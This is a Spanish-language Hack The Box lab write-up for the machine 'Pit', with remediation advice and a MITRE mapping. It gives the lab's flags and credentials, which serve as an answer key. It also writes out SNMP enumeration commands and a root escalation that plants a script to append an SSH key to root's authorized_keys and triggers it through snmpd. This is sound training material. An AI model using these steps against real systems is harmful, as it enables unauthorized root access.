---
title: "Informe Técnico: Pit (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Pit de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Pit

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Pit** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Explotación de servicio de red
* **Vector de Elevación de Privilegios:** Escalada local de privilegios
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Pit |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Medium |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Explotación de servicio de red |
| **Mecanismo de Escalada** | Escalada local de privilegios |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Explotación de servicio de red
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: Escalada local de privilegios
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

**How many open TCP ports are listening on Pit?**

R: 3

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_01.png)

**What UDP port is listening on Pit?**

R: 161

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_02.png)

**What community string allows access to the SNMP service?**

R:  public

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_03.png)

```jsx
 snmpwalk -cpublic -v2c 10.10.10.241
```

**What is the full URL of the document management application on the webserver?**

R:  [http://dms-pit.htb/seeddms51x/seeddms](http://dms-pit.htb/seeddms51x/seeddms/out/out.Login.php?referuri=%2Fseeddms51x%2Fseeddms%2F)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_04.png)

```jsx
snmpwalk -v2c -c public pit.htb 1.3.6.1.4.1.2021.9.1.2 \
| awk -F\" '/\/var\/www\/html\//{print $2}'
/var/www/html/seeddms51x/seeddms

snmpwalk -cpublic -v2c 10.10.10.241  .1.3.6.1.4.1.2021.9
snmpwalk -cpublic -v2c 10.10.10.241 .1.3.6.1.4.1.8072.1.3.2

REL=$(snmpwalk -v2c -c public pit.htb 1.3.6.1.4.1.2021.9.1.2 \
      | awk -F\" '/\/var\/www\/html\//{sub("^/var/www/html","",$2); print $2; exit}')
URL="http://dms-pit.htb${REL}/"
echo "$URL"

```

What username leaked over SNMP uses their username as their password on the SeedDMS instance?

R: michelle

pass: michelle

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_05.png)

What is the 2019 CVE ID for a remote code execution vulnerability in SeedDMS that was patched in version 5.1.11?

R: `CVE-2019-12744`

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_06.png)

**CVE-2019-12744 is patched by including what file in the `data` directory?**

R: .htaccess

**What user is the webserver running as?**

R: nginx

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_07.png)

**What is the password used by SeedDMS to connect to the MySQL database?**

R: ied^ieY6xoquu

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_08.png)

**What user reused the database password as their password on the system and thus on the Cockpit service running on 9090?**

R: michelle

**Submit the flag located in the michelle user's home directory.**

R: cf46cfaf5c9567ec1fec0a40aa3051f1

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_09.png)

**What is the full path to the Bash script that's being run by snmpd via the extended command named "monitoring"?**

R: /usr/bin/monitor

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_10.png)

**Scripts from what directory that's writable by the michelle user are executed by the `monitor` script?**

R: /usr/local/monitoring

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_11.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_12.png)

**Submit the flag located in the root user's home directory.**

R:0e86ae74210d696b292c71005efe3671

```jsx
ssh-keygen -t ed25519 -f ~/.ssh/pit_root -C "pit-root" -N ''
echo 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKOna3yKxmb6U80tO6a4EbcRne/EXrPdYMe72n/eldiB pit-root" >> /root/.ssh/authorized_keys' > /usr/local/monitoring/check_key.sh
snmpwalk -cpublic -v2c 10.10.10.241 .1.3.6.1.4.1.8072.1.3.2
ssh -i ~/.ssh/pit_root -o StrictHostKeyChecking=no root@pit.htb
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_13.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_14.png)

![Captura de pantalla 2025-08-29 005048.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_15.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/pit/images/step_16.png)

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Explotación de servicio de red) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (Escalada local de privilegios) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
